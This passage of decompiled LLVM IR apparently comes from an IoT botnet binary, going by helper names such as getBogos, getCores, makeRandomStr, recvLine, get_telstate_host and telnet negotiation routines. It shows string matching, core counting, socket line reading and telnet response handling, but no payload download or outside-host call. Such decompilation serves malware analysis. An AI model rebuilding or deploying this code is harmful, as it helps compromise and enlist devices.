  %v4_93e4 = call i32 @wildString(i8* %v3_93e4, i32 %arg2)
  %v2_93ec = icmp eq i32 %v4_93e4, 0
  br i1 %v2_93ec, label %dec_label_pc_9430, label %dec_label_pc_93f4

dec_label_pc_93f4:                                ; preds = %dec_label_pc_93d4
  %v2_93f8 = load i8, i8* %tmp, align 1
  %v2_93fc = icmp eq i8 %v2_93f8, 0
  br i1 %v2_93fc, label %dec_label_pc_9438, label %dec_label_pc_9404

dec_label_pc_9404:                                ; preds = %dec_label_pc_93f4
  %v1_9408 = add i32 %arg2, 1
  %v4_9414 = call i32 @wildString(i8* nonnull %arg1, i32 %v1_9408)
  %v2_941c = icmp eq i32 %v4_9414, 0
  br i1 %v2_941c, label %dec_label_pc_9430, label %dec_label_pc_9438

dec_label_pc_9430:                                ; preds = %dec_label_pc_9404, %dec_label_pc_93d4
  br label %dec_label_pc_9438

dec_label_pc_9438:                                ; preds = %dec_label_pc_93f4, %dec_label_pc_9404, %dec_label_pc_9430
  %storemerge4 = phi i32 [ 0, %dec_label_pc_9430 ], [ 1, %dec_label_pc_9404 ], [ 1, %dec_label_pc_93f4 ]
  br label %dec_label_pc_9510

dec_label_pc_9444:                                ; preds = %dec_label_pc_93a8
  %v2_9448 = load i8, i8* %tmp, align 1
  %v2_944c = icmp eq i8 %v2_9448, 0
  br i1 %v2_944c, label %dec_label_pc_9490, label %dec_label_pc_9454

dec_label_pc_9454:                                ; preds = %dec_label_pc_9444
  %v1_9458 = add i32 %tmp9, 1
  %v1_9460 = add i32 %arg2, 1
  %v2_946c = inttoptr i32 %v1_9458 to i8*
  %v3_946c = call i32 @wildString(i8* %v2_946c, i32 %v1_9460)
  %v2_9474 = icmp ne i32 %v3_946c, 0
  %. = zext i1 %v2_9474 to i32
  br label %dec_label_pc_9490

dec_label_pc_9490:                                ; preds = %dec_label_pc_9454, %dec_label_pc_9444
  %storemerge3 = phi i32 [ 1, %dec_label_pc_9444 ], [ %., %dec_label_pc_9454 ]
  br label %dec_label_pc_9510

dec_label_pc_949c:                                ; preds = %dec_label_pc_93b4
  %v2_94a0 = load i8, i8* %arg1, align 1
  %v3_94a0 = zext i8 %v2_94a0 to i32
  %v1_94a8 = call i32 @__GI_toupper(i32 %v3_94a0)
  store i32 %v1_94a8, i32* @r4, align 4
  %v2_94b4 = load i8, i8* %tmp, align 1
  %v3_94b4 = zext i8 %v2_94b4 to i32
  %v1_94bc = call i32 @__GI_toupper(i32 %v3_94b4)
  %v0_94c4 = load i32, i32* @r4, align 4
  %v9_94c4 = icmp eq i32 %v0_94c4, %v1_94bc
  br i1 %v9_94c4, label %dec_label_pc_94cc, label %dec_label_pc_9508

dec_label_pc_94cc:                                ; preds = %dec_label_pc_949c
  %v1_94d0 = add i32 %tmp9, 1
  %v1_94d8 = add i32 %arg2, 1
  %v2_94e4 = inttoptr i32 %v1_94d0 to i8*
  %v3_94e4 = call i32 @wildString(i8* %v2_94e4, i32 %v1_94d8)
  %v2_94ec = icmp ne i32 %v3_94e4, 0
  %.8 = zext i1 %v2_94ec to i32
  br label %dec_label_pc_9508

dec_label_pc_9508:                                ; preds = %dec_label_pc_94cc, %dec_label_pc_949c
  %storemerge = phi i32 [ 1, %dec_label_pc_949c ], [ %.8, %dec_label_pc_94cc ]
  br label %dec_label_pc_9510

dec_label_pc_9510:                                ; preds = %dec_label_pc_9490, %dec_label_pc_9438, %dec_label_pc_93c4, %dec_label_pc_9508
  %stack_var_-44.0 = phi i32 [ %storemerge4, %dec_label_pc_9438 ], [ %storemerge3, %dec_label_pc_9490 ], [ %v3_93c8, %dec_label_pc_93c4 ], [ %storemerge, %dec_label_pc_9508 ]
  store i32 %v3_937c, i32* @r4, align 4
  store i32 %v6_937c, i32* @fp, align 4
  ret i32 %stack_var_-44.0

; uselistorder directives
  uselistorder i32* %stack_var_-4, { 1, 0 }
  uselistorder i8* %tmp, { 0, 2, 3, 1 }
  uselistorder i32 %arg2, { 3, 2, 0, 1, 4 }
  uselistorder label %dec_label_pc_9510, { 3, 0, 1, 2 }
  uselistorder label %dec_label_pc_9438, { 2, 1, 0 }
}

define i32 @getHost(i32 %arg1, i32* %arg2) local_unnamed_addr {
entry:
  store i32 %arg1, i32* @r0, align 4
  %v1_9540 = call i32 @inet_addr(i32 %arg1)
  store i32 %v1_9540, i32* %arg2, align 4
  %v3_9558 = icmp eq i32 %v1_9540, -1
  %. = zext i1 %v3_9558 to i32
  ret i32 %.

; uselistorder directives
  uselistorder i32 %arg1, { 1, 0 }
}

define i32 @uppercase(i8* %arg1) local_unnamed_addr {
entry:
  %r0.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i8* %arg1 to i32
  store i32 %tmp, i32* %r0.global-to-local, align 4
  %stack_var_-20 = alloca i8*, align 4
  %v0_9594 = load i32, i32* %r0.global-to-local, align 4
  %storemerge2 = inttoptr i32 %v0_9594 to i8*
  store i8* %storemerge2, i8** %stack_var_-20, align 4
  %v2_95cc3 = load i8, i8* %storemerge2, align 1
  %v2_95d05 = icmp eq i8 %v2_95cc3, 0
  br i1 %v2_95d05, label %dec_label_pc_95d8, label %dec_label_pc_959c

dec_label_pc_959c:                                ; preds = %entry, %dec_label_pc_959c
  %v2_95d88 = phi i8* [ %storemerge, %dec_label_pc_959c ], [ %storemerge2, %entry ]
  %v2_95a0 = load i8, i8* %v2_95d88, align 1
  %v3_95a0 = zext i8 %v2_95a0 to i32
  store i32 %v3_95a0, i32* %r0.global-to-local, align 4
  %v1_95a8 = call i32 @__GI_toupper(i32 %v3_95a0)
  store i32 %v1_95a8, i32* %r0.global-to-local, align 4
  %v3_95b4 = load i8*, i8** %stack_var_-20, align 4
  %v1_95b8 = trunc i32 %v1_95a8 to i8
  store i8 %v1_95b8, i8* %v3_95b4, align 1
  %v4_95bc = ptrtoint i8* %v3_95b4 to i32
  %v1_95c0 = add i32 %v4_95bc, 1
  %storemerge = inttoptr i32 %v1_95c0 to i8*
  store i8* %storemerge, i8** %stack_var_-20, align 4
  %v2_95cc = load i8, i8* %storemerge, align 1
  %v2_95d0 = icmp eq i8 %v2_95cc, 0
  br i1 %v2_95d0, label %dec_label_pc_95c8.dec_label_pc_95d8_crit_edge, label %dec_label_pc_959c

dec_label_pc_95c8.dec_label_pc_95d8_crit_edge:    ; preds = %dec_label_pc_959c
  %v13_95d8.pre = load i32, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_95d8

dec_label_pc_95d8:                                ; preds = %dec_label_pc_95c8.dec_label_pc_95d8_crit_edge, %entry
  %v13_95d8 = phi i32 [ %v13_95d8.pre, %dec_label_pc_95c8.dec_label_pc_95d8_crit_edge ], [ %v0_9594, %entry ]
  ret i32 %v13_95d8

; uselistorder directives
  uselistorder i8* %storemerge, { 1, 2, 0 }
  uselistorder i8** %stack_var_-20, { 1, 2, 0 }
  uselistorder i32* %r0.global-to-local, { 3, 4, 2, 0, 1 }
  uselistorder label %dec_label_pc_959c, { 1, 0 }
}

define i32 @getBogos(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %stack_var_-4120 = alloca i32, align 4
  %stack_var_-4112 = alloca i32, align 4
  %stack_var_-16 = alloca i32, align 4
  %v3_95e0 = load i32, i32* @fp, align 4
  store i32 %v3_95e0, i32* %stack_var_-16, align 4
  %v13_95e0 = ptrtoint i32* %stack_var_-16 to i32
  store i32 %v13_95e0, i32* @r2, align 4
  %v4_9608 = call i32 @__libc_open(i8* getelementptr inbounds ([14 x i8], [14 x i8]* @global_var_1a6ec.48, i32 0, i32 0), i32 0)
  %v2_97cc = ptrtoint i32* %stack_var_-4120 to i32
  %v1_9628 = bitcast i32* %stack_var_-4120 to i8*
  br label %dec_label_pc_97c4

dec_label_pc_9618:                                ; preds = %dec_label_pc_97c4
  %v2_9628 = call i32 @uppercase(i8* %v1_9628)
  %v4_9640 = call i32 @strstr(i32 %v2_97cc, i8* getelementptr inbounds ([9 x i8], [9 x i8]* @global_var_1a6fc.50, i32 0, i32 0))
  %v9_9658 = icmp eq i32 %v4_9640, %v2_97cc
  br i1 %v9_9658, label %dec_label_pc_9660, label %dec_label_pc_97a8

dec_label_pc_9660:                                ; preds = %dec_label_pc_9618
  %tmp18 = bitcast i32* %stack_var_-4112 to i8*
  br label %dec_label_pc_9684

dec_label_pc_9678:                                ; preds = %dec_label_pc_96a4, %dec_label_pc_9694, %dec_label_pc_9684
  %v1_967c = add i32 %v4_9684, 1
  %v5_9680 = inttoptr i32 %v1_967c to i8*
  br label %dec_label_pc_9684

dec_label_pc_9684:                                ; preds = %dec_label_pc_9660, %dec_label_pc_9678
  %storemerge2 = phi i8* [ %v5_9680, %dec_label_pc_9678 ], [ %tmp18, %dec_label_pc_9660 ]
  %v4_9684 = ptrtoint i8* %storemerge2 to i32
  %v2_9688 = load i8, i8* %storemerge2, align 1
  %v7_968c = icmp eq i8 %v2_9688, 32
  br i1 %v7_968c, label %dec_label_pc_9678, label %dec_label_pc_9694

dec_label_pc_9694:                                ; preds = %dec_label_pc_9684
  %v2_9698 = load i8, i8* %storemerge2, align 1
  %v7_969c = icmp eq i8 %v2_9698, 9
  br i1 %v7_969c, label %dec_label_pc_9678, label %dec_label_pc_96a4

dec_label_pc_96a4:                                ; preds = %dec_label_pc_9694
  %v2_96a8 = load i8, i8* %storemerge2, align 1
  %v7_96ac = icmp eq i8 %v2_96a8, 58
  br i1 %v7_96ac, label %dec_label_pc_9678, label %dec_label_pc_96e0.preheader

dec_label_pc_96e0.preheader:                      ; preds = %dec_label_pc_96a4
  %v2_96f8 = add i32 %v4_9684, -1
  br label %dec_label_pc_96e0

dec_label_pc_96b8:                                ; preds = %dec_label_pc_96e0, %dec_label_pc_970c
  %v3_96c0 = call i32 @strlen(i8* %storemerge2)
  %v1_96d4 = add i32 %v2_96f8, %v3_96c0
  %v3_96dc = inttoptr i32 %v1_96d4 to i8*
  store i8 0, i8* %v3_96dc, align 1
  br label %dec_label_pc_96e0

dec_label_pc_96e0:                                ; preds = %dec_label_pc_96e0.preheader, %dec_label_pc_96b8
  %v3_96e8 = call i32 @strlen(i8* %storemerge2)
  %v1_96fc = add i32 %v3_96e8, %v2_96f8
  %v1_9700 = inttoptr i32 %v1_96fc to i8*
  %v2_9700 = load i8, i8* %v1_9700, align 1
  %v7_9704 = icmp eq i8 %v2_9700, 13
  br i1 %v7_9704, label %dec_label_pc_96b8, label %dec_label_pc_970c

dec_label_pc_970c:                                ; preds = %dec_label_pc_96e0
  %v3_9714 = call i32 @strlen(i8* %storemerge2)
  %v1_9728 = add i32 %v3_9714, %v2_96f8
  %v1_972c = inttoptr i32 %v1_9728 to i8*
  %v2_972c = load i8, i8* %v1_972c, align 1
  %v7_9730 = icmp eq i8 %v2_972c, 10
  br i1 %v7_9730, label %dec_label_pc_96b8, label %dec_label_pc_9738

dec_label_pc_9738:                                ; preds = %dec_label_pc_970c
  %v2_9744 = call i32 @__GI_strchr(i32 %v4_9684, i32 46)
  %v2_974c = icmp eq i32 %v2_9744, 0
  br i1 %v2_974c, label %dec_label_pc_9770, label %dec_label_pc_9754

dec_label_pc_9754:                                ; preds = %dec_label_pc_9738
  %v2_9760 = call i32 @__GI_strchr(i32 %v4_9684, i32 46)
  %v3_976c = inttoptr i32 %v2_9760 to i8*
  store i8 0, i8* %v3_976c, align 1
  br label %dec_label_pc_9770

dec_label_pc_9770:                                ; preds = %dec_label_pc_9738, %dec_label_pc_9754
  %v3_978c = call i32 @strcpy(i32 %arg1, i8* %storemerge2)
  %v1_9794 = call i32 @__libc_close(i32 %v4_9608)
  br label %dec_label_pc_9800

dec_label_pc_97a8:                                ; preds = %dec_label_pc_9618
  store i32 4096, i32* @r2, align 4
  %v3_97c0 = call i32 @__GI_memset(i8* %v1_9628, i32 0)
  br label %dec_label_pc_97c4

dec_label_pc_97c4:                                ; preds = %entry, %dec_label_pc_97a8
  %v4_97dc = call i32 @fdgets(i32 %v2_97cc, i32 4096, i32 %v4_9608, i32 %v2_97cc)
  %v2_97e4 = icmp eq i32 %v4_97dc, 0
  br i1 %v2_97e4, label %dec_label_pc_97ec, label %dec_label_pc_9618

dec_label_pc_97ec:                                ; preds = %dec_label_pc_97c4
  %v1_97f0 = call i32 @__libc_close(i32 %v4_9608)
  br label %dec_label_pc_9800

dec_label_pc_9800:                                ; preds = %dec_label_pc_9770, %dec_label_pc_97ec
  %storemerge4 = phi i32 [ 1, %dec_label_pc_97ec ], [ 0, %dec_label_pc_9770 ]
  ret i32 %storemerge4

; uselistorder directives
  uselistorder i32 %v2_96f8, { 1, 2, 0 }
  uselistorder i8* %storemerge2, { 0, 1, 3, 2, 4, 5, 7, 6 }
  uselistorder i32 %v2_97cc, { 0, 3, 1, 2 }
  uselistorder i32 %v4_9608, { 1, 2, 0 }
  uselistorder i32* %stack_var_-16, { 1, 0 }
  uselistorder label %dec_label_pc_9800, { 1, 0 }
  uselistorder label %dec_label_pc_97c4, { 1, 0 }
  uselistorder label %dec_label_pc_9770, { 1, 0 }
  uselistorder label %dec_label_pc_96e0, { 1, 0 }
  uselistorder label %dec_label_pc_96b8, { 1, 0 }
  uselistorder label %dec_label_pc_9684, { 1, 0 }
}

define i32 @getCores(i32 %arg1) local_unnamed_addr {
entry:
  %stack_var_-4120 = alloca i32, align 4
  %v2_982c = ptrtoint i32* %stack_var_-4120 to i32
  %v4_9840 = call i32 @__libc_open(i8* getelementptr inbounds ([14 x i8], [14 x i8]* @global_var_1a6ec.48, i32 0, i32 0), i32 0)
  %v1_9860 = bitcast i32* %stack_var_-4120 to i8*
  br label %dec_label_pc_98bc

dec_label_pc_9850:                                ; preds = %dec_label_pc_98bc
  %v2_9860 = call i32 @uppercase(i8* %v1_9860)
  %v4_9878 = call i32 @strstr(i32 %v2_982c, i8* getelementptr inbounds ([9 x i8], [9 x i8]* @global_var_1a6fc.50, i32 0, i32 0))
  %v9_988c = icmp eq i32 %v4_9878, %v2_982c
  br i1 %v9_988c, label %dec_label_pc_9894, label %dec_label_pc_98a0

dec_label_pc_9894:                                ; preds = %dec_label_pc_9850
  %v1_9898 = add i32 %stack_var_-24.1, 1
  br label %dec_label_pc_98a0

dec_label_pc_98a0:                                ; preds = %dec_label_pc_9850, %dec_label_pc_9894
  %stack_var_-24.0 = phi i32 [ %v1_9898, %dec_label_pc_9894 ], [ %stack_var_-24.1, %dec_label_pc_9850 ]
  store i32 4096, i32* @r2, align 4
  %v3_98b8 = call i32 @__GI_memset(i8* %v1_9860, i32 0)
  br label %dec_label_pc_98bc

dec_label_pc_98bc:                                ; preds = %entry, %dec_label_pc_98a0
  %stack_var_-24.1 = phi i32 [ 0, %entry ], [ %stack_var_-24.0, %dec_label_pc_98a0 ]
  %v4_98d4 = call i32 @fdgets(i32 %v2_982c, i32 4096, i32 %v4_9840, i32 %v2_982c)
  %v2_98dc = icmp eq i32 %v4_98d4, 0
  br i1 %v2_98dc, label %dec_label_pc_98e4, label %dec_label_pc_9850

dec_label_pc_98e4:                                ; preds = %dec_label_pc_98bc
  %v1_98e8 = call i32 @__libc_close(i32 %v4_9840)
  ret i32 %stack_var_-24.1

; uselistorder directives
  uselistorder i32 %stack_var_-24.1, { 0, 2, 1 }
  uselistorder i32 %v2_982c, { 0, 3, 1, 2 }
  uselistorder label %dec_label_pc_98bc, { 1, 0 }
  uselistorder label %dec_label_pc_98a0, { 1, 0 }
}

define i32 @makeRandomStr(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %r0.global-to-local = alloca i32, align 4
  store i32 %arg1, i32* %r0.global-to-local, align 4
  %stack_var_-32 = alloca i32, align 4
  %v3_9908 = load i32, i32* @r4, align 4
  %v6_9908 = load i32, i32* @fp, align 4
  %v0_9914 = load i32, i32* %r0.global-to-local, align 4
  store i32 %arg2, i32* %stack_var_-32, align 4
  %v5_998017 = icmp sgt i32 %arg2, 0
  br i1 %v5_998017, label %dec_label_pc_9930, label %dec_label_pc_9984

dec_label_pc_9930:                                ; preds = %entry, %dec_label_pc_9930
  %storemerge118 = phi i32 [ %v1_996c, %dec_label_pc_9930 ], [ 0, %entry ]
  %v2_993c = add i32 %storemerge118, %v0_9914
  store i32 %v2_993c, i32* @r4, align 4
  %v0_9940 = call i32 @rand_cmwc()
  %v2_9950 = urem i32 %v0_9940, 26
  store i32 %v2_9950, i32* %r0.global-to-local, align 4
  %v1_995c = add nuw nsw i32 %v2_9950, 65
  %v1_9964 = trunc i32 %v1_995c to i8
  %v2_9964 = load i32, i32* @r4, align 4
  %v3_9964 = inttoptr i32 %v2_9964 to i8*
  store i8 %v1_9964, i8* %v3_9964, align 1
  %v1_996c = add i32 %storemerge118, 1
  %v3_9978.pre = load i32, i32* %stack_var_-32, align 4
  %v5_9980 = icmp slt i32 %v1_996c, %v3_9978.pre
  br i1 %v5_9980, label %dec_label_pc_9930, label %dec_label_pc_9974.dec_label_pc_9984_crit_edge

dec_label_pc_9974.dec_label_pc_9984_crit_edge:    ; preds = %dec_label_pc_9930
  %v12_9988.pre = load i32, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_9984

dec_label_pc_9984:                                ; preds = %dec_label_pc_9974.dec_label_pc_9984_crit_edge, %entry
  %v12_9988 = phi i32 [ %v12_9988.pre, %dec_label_pc_9974.dec_label_pc_9984_crit_edge ], [ %v0_9914, %entry ]
  store i32 %v3_9908, i32* @r4, align 4
  store i32 %v6_9908, i32* @fp, align 4
  ret i32 %v12_9988

; uselistorder directives
  uselistorder i32 %v1_996c, { 1, 0 }
  uselistorder i32* %r0.global-to-local, { 2, 3, 0, 1 }
  uselistorder label %dec_label_pc_9930, { 1, 0 }
}

define i32 @recvLine(i32 %arg1, i8* %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
dec_label_pc_99e0.lr.ph:
  %tmp33 = call i32 @__decompiler_undefined_function_0()
  %stack_var_-185 = alloca i8, align 1
  %stack_var_-184 = alloca i32, align 4
  %stack_var_-176 = alloca i32, align 4
  %stack_var_-4 = alloca i32, align 4
  %stack_var_-16 = alloca i32, align 4
  %v3_9990 = load i32, i32* @fp, align 4
  store i32 %v3_9990, i32* %stack_var_-16, align 4
  store i32 39320, i32* %stack_var_-4, align 4
  %v2_9994 = ptrtoint i32* %stack_var_-4 to i32
  store i32 %v2_9994, i32* @fp, align 4
  store i32 %arg3, i32* @r2, align 4
  %v4_99b8 = call i32 @__GI_memset(i8* %arg2, i32 0)
  store i32 30, i32* %stack_var_-184, align 4
  %v2_99cc = ptrtoint i32* %stack_var_-176 to i32
  br label %dec_label_pc_99e0

dec_label_pc_99e0:                                ; preds = %dec_label_pc_99e0.lr.ph, %dec_label_pc_99e0
  %storemerge527 = phi i32 [ 0, %dec_label_pc_99e0.lr.ph ], [ %v1_99f4, %dec_label_pc_99e0 ]
  %v5_99ec = mul nuw nsw i32 %storemerge527, 4
  %v6_99ec = add i32 %v5_99ec, %v2_99cc
  %v7_99ec = inttoptr i32 %v6_99ec to i32*
  store i32 0, i32* %v7_99ec, align 4
  %v1_99f4 = add nuw nsw i32 %storemerge527, 1
  %tmp52 = icmp ult i32 %v1_99f4, 32
  br i1 %tmp52, label %dec_label_pc_99e0, label %dec_label_pc_9a08

dec_label_pc_9a08:                                ; preds = %dec_label_pc_99e0
  %v13_9990 = ptrtoint i32* %stack_var_-16 to i32
  %v3_9a0c = udiv i32 %arg1, 32
  %v3_9a18 = mul nuw nsw i32 %v3_9a0c, 4
  %v2_9a20 = add nsw i32 %v3_9a18, -160
  %v2_9a24 = add i32 %v2_9a20, %v13_9990
  %v1_9a28 = inttoptr i32 %v2_9a24 to i32*
  %v2_9a28 = load i32, i32* %v1_9a28, align 4
  %v1_9a30 = urem i32 %arg1, 32
  %v6_9a38 = shl i32 1, %v1_9a30
  %v2_9a3c = or i32 %v2_9a28, %v6_9a38
  store i32 %v2_9a3c, i32* %v1_9a28, align 4
  %v1_9a5c = add i32 %arg1, 1
  %v2_9a68 = ptrtoint i32* %stack_var_-184 to i32
  store i32 0, i32* @r2, align 4
  %v5_9a7c = call i32 @__libc_select(i32 %v1_9a5c, i32 %v2_99cc, i32 0, i32 %v2_99cc, i32 %v2_9a68)
  %v5_9a90 = icmp sgt i32 %v5_9a7c, 0
  br i1 %v5_9a90, label %dec_label_pc_9c24.preheader, label %dec_label_pc_9b90.preheader

dec_label_pc_9b90.preheader:                      ; preds = %dec_label_pc_9a08
  %v7_9b9823 = icmp slt i32 %tmp33, 10
  br i1 %v7_9b9823, label %dec_label_pc_9ad0.lr.ph, label %dec_label_pc_9c24.preheader

dec_label_pc_9ad0.lr.ph:                          ; preds = %dec_label_pc_9b90.preheader, %dec_label_pc_9b84
  %stack_var_-44.024 = phi i32 [ %v1_9b88, %dec_label_pc_9b84 ], [ %tmp33, %dec_label_pc_9b90.preheader ]
  %v2_9a9c = load i32, i32* @global_var_2c908.54, align 4
  %v3_9aa8 = call i32 @sockprintf(i32 %v2_9a9c, i32 ptrtoint ([5 x i8]* @global_var_1a708.56 to i32))
  store i32 30, i32* %stack_var_-184, align 4
  br label %dec_label_pc_9ad0

dec_label_pc_9ad0:                                ; preds = %dec_label_pc_9ad0.lr.ph, %dec_label_pc_9ad0
  %storemerge615 = phi i32 [ 0, %dec_label_pc_9ad0.lr.ph ], [ %v1_9ae4, %dec_label_pc_9ad0 ]
  %v5_9adc = mul nuw nsw i32 %storemerge615, 4
  %v6_9adc = add i32 %v5_9adc, %v2_99cc
  %v7_9adc = inttoptr i32 %v6_9adc to i32*
  store i32 0, i32* %v7_9adc, align 4
  %v1_9ae4 = add nuw nsw i32 %storemerge615, 1
  %tmp53 = icmp ult i32 %v1_9ae4, 32
  br i1 %tmp53, label %dec_label_pc_9ad0, label %dec_label_pc_9af8

dec_label_pc_9af8:                                ; preds = %dec_label_pc_9ad0
  %v2_9b18 = load i32, i32* %v1_9a28, align 4
  %v2_9b2c = or i32 %v2_9b18, %v6_9a38
  store i32 %v2_9b2c, i32* %v1_9a28, align 4
  store i32 0, i32* @r2, align 4
  %v5_9b6c = call i32 @__libc_select(i32 %v1_9a5c, i32 %v2_99cc, i32 0, i32 %v2_99cc, i32 %v2_9a68)
  %v5_9b80 = icmp sgt i32 %v5_9b6c, 0
  br i1 %v5_9b80, label %dec_label_pc_9c24.preheader, label %dec_label_pc_9b84

dec_label_pc_9b84:                                ; preds = %dec_label_pc_9af8
  %v1_9b88 = add nsw i32 %stack_var_-44.024, 1
  %v7_9b98 = icmp slt i32 %v1_9b88, 10
  br i1 %v7_9b98, label %dec_label_pc_9ad0.lr.ph, label %dec_label_pc_9c24.preheader

dec_label_pc_9c24.preheader:                      ; preds = %dec_label_pc_9b84, %dec_label_pc_9af8, %dec_label_pc_9b90.preheader, %dec_label_pc_9a08
  %v5_9bcc = bitcast i8* %stack_var_-185 to i32*
  %not.v7_9c2c57 = icmp sgt i32 %arg3, 1
  %v2_9c4459 = icmp eq i1 %not.v7_9c2c57, false
  br i1 %v2_9c4459, label %dec_label_pc_9c4c, label %dec_label_pc_9bb0

dec_label_pc_9bb0:                                ; preds = %dec_label_pc_9c24.preheader, %dec_label_pc_9c18
  %v1_9c2862.in = phi i32 [ %v1_9c2862, %dec_label_pc_9c18 ], [ %arg3, %dec_label_pc_9c24.preheader ]
  %stack_var_-40.061 = phi i8* [ %v5_9c08, %dec_label_pc_9c18 ], [ %arg2, %dec_label_pc_9c24.preheader ]
  %stack_var_-36.060 = phi i32 [ %v1_9c1c, %dec_label_pc_9c18 ], [ 0, %dec_label_pc_9c24.preheader ]
  %v1_9c2862 = add i32 %v1_9c2862.in, -1
  %v2_9bb4 = load i32, i32* @global_var_2c908.54, align 4
  %v6_9bcc = call i32 @__libc_recv(i32 %v2_9bb4, i32* %v5_9bcc, i32 1, i32 0, i32 %v1_9c2862)
  %v7_9bd4 = icmp eq i32 %v6_9bcc, 1
  br i1 %v7_9bd4, label %dec_label_pc_9bf4, label %dec_label_pc_9bdc

dec_label_pc_9bdc:                                ; preds = %dec_label_pc_9bb0
  store i8 0, i8* %stack_var_-40.061, align 1
  br label %dec_label_pc_9c60

dec_label_pc_9bf4:                                ; preds = %dec_label_pc_9bb0
  %v3_9bf4 = load i8, i8* %stack_var_-185, align 1
  %v4_9bf8 = ptrtoint i8* %stack_var_-40.061 to i32
  store i8 %v3_9bf4, i8* %stack_var_-40.061, align 1
  %v1_9c04 = add i32 %v4_9bf8, 1
  %v5_9c08 = inttoptr i32 %v1_9c04 to i8*
  %v3_9c0c = load i8, i8* %stack_var_-185, align 1
  %v7_9c10 = icmp eq i8 %v3_9c0c, 10
  br i1 %v7_9c10, label %dec_label_pc_9c4c, label %dec_label_pc_9c18

dec_label_pc_9c18:                                ; preds = %dec_label_pc_9bf4
  %v1_9c1c = add i32 %stack_var_-36.060, 1
  %not.v7_9c2c = icmp sgt i32 %v1_9c2862, 1
  %v2_9c44 = icmp eq i1 %not.v7_9c2c, false
  br i1 %v2_9c44, label %dec_label_pc_9c4c, label %dec_label_pc_9bb0

dec_label_pc_9c4c:                                ; preds = %dec_label_pc_9bf4, %dec_label_pc_9c18, %dec_label_pc_9c24.preheader
  %stack_var_-36.0.lcssa = phi i32 [ 0, %dec_label_pc_9c24.preheader ], [ %v1_9c1c, %dec_label_pc_9c18 ], [ %stack_var_-36.060, %dec_label_pc_9bf4 ]
  %stack_var_-40.1 = phi i8* [ %arg2, %dec_label_pc_9c24.preheader ], [ %v5_9c08, %dec_label_pc_9c18 ], [ %v5_9c08, %dec_label_pc_9bf4 ]
  store i8 0, i8* %stack_var_-40.1, align 1
  br label %dec_label_pc_9c60

dec_label_pc_9c60:                                ; preds = %dec_label_pc_9bdc, %dec_label_pc_9c4c
  %storemerge = phi i32 [ -1, %dec_label_pc_9bdc ], [ %stack_var_-36.0.lcssa, %dec_label_pc_9c4c ]
  %v2_9c6c = load i32, i32* %stack_var_-16, align 4
  store i32 %v2_9c6c, i32* @fp, align 4
  ret i32 %storemerge

; uselistorder directives
  uselistorder i32 %v1_9c2862, { 1, 0, 2 }
  uselistorder i8* %stack_var_-40.061, { 1, 2, 0 }
  uselistorder i32 %v1_9b88, { 1, 0 }
  uselistorder i32 %storemerge615, { 1, 0 }
  uselistorder i32 %storemerge527, { 1, 0 }
  uselistorder i32 %v2_99cc, { 4, 3, 0, 5, 2, 1 }
  uselistorder i32* %stack_var_-16, { 0, 2, 1 }
  uselistorder i32* %stack_var_-4, { 1, 0 }
  uselistorder i32* %stack_var_-184, { 0, 2, 1 }
  uselistorder i8* %stack_var_-185, { 2, 1, 0 }
  uselistorder i32 %arg1, { 2, 1, 0 }
  uselistorder label %dec_label_pc_9c60, { 1, 0 }
  uselistorder label %dec_label_pc_9c4c, { 1, 0, 2 }
  uselistorder label %dec_label_pc_9bb0, { 1, 0 }
  uselistorder label %dec_label_pc_9ad0, { 1, 0 }
  uselistorder label %dec_label_pc_9ad0.lr.ph, { 1, 0 }
  uselistorder label %dec_label_pc_99e0, { 1, 0 }
}

define i32 @get_telstate_host(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %v3_9c7c = load i32, i32* @fp, align 4
  %v1_9c90 = add i32 %arg1, 4
  %v2_9c90 = inttoptr i32 %v1_9c90 to i32*
  %v3_9c90 = load i32, i32* %v2_9c90, align 4
  store i32 %v3_9c90, i32* @r0, align 4
  %v1_9c9c = call i32 @__GI_inet_ntoa(i32 %v3_9c90)
  store i32 %v3_9c7c, i32* @fp, align 4
  ret i32 %v1_9c9c
}

define i32 @read_until_response(i32 %arg1, i32 %arg2, i8* %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %tmp = ptrtoint i8* %arg3 to i32
  %stack_var_-4 = alloca i32, align 4
  %stack_var_0 = alloca i32, align 4
  %v3_9cb4 = load i32, i32* @fp, align 4
  store i32 40124, i32* %stack_var_-4, align 4
  %v2_9cb8 = ptrtoint i32* %stack_var_-4 to i32
  store i32 %v2_9cb8, i32* @fp, align 4
  store i32 %arg4, i32* @r2, align 4
  %v4_9ce0 = call i32 @__GI_memset(i8* %arg3, i32 0)
  %v5_9cf4 = call i32 @read_with_timeout(i32 %arg1, i32 %arg2, i32 %tmp, i32 %arg4)
  %v2_9d04 = load i8, i8* %arg3, align 1
  %v2_9d08 = icmp eq i8 %v2_9d04, -1
  br i1 %v2_9d08, label %dec_label_pc_9d10, label %dec_label_pc_9d20

dec_label_pc_9d10:                                ; preds = %entry
  %v3_9d04 = zext i8 %v2_9d04 to i32
  %v6_9d1c = call i32 @negotiate(i32 %arg1, i32 %tmp, i32 3, i32 %v3_9d04, i32 %v5_9cf4)
  br label %dec_label_pc_9d20

dec_label_pc_9d20:                                ; preds = %entry, %dec_label_pc_9d10
  %v3_9d24 = load i32, i32* %stack_var_0, align 4
  %v3_9d28 = call i32 @contains_string(i32 %tmp, i32 %v3_9d24)
  %v2_9d30 = icmp ne i32 %v3_9d28, 0
  %. = zext i1 %v2_9d30 to i32
  store i32 %v3_9cb4, i32* @fp, align 4
  ret i32 %.

; uselistorder directives
  uselistorder i8 %v2_9d04, { 1, 0 }
  uselistorder i32* %stack_var_-4, { 1, 0 }
  uselistorder i32 %arg4, { 1, 0 }
  uselistorder label %dec_label_pc_9d20, { 1, 0 }
}

define i32 @read_with_timeout(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
dec_label_pc_9da0.lr.ph:
  %stack_var_-160 = alloca i32, align 4
  %stack_var_-152 = alloca i32, align 4
  %stack_var_-16 = alloca i32, align 4
  %v3_9d60 = load i32, i32* @fp, align 4
  store i32 %v3_9d60, i32* %stack_var_-16, align 4
  store i32 0, i32* %stack_var_-160, align 4
  %v2_9d8c = ptrtoint i32* %stack_var_-152 to i32
  br label %dec_label_pc_9da0

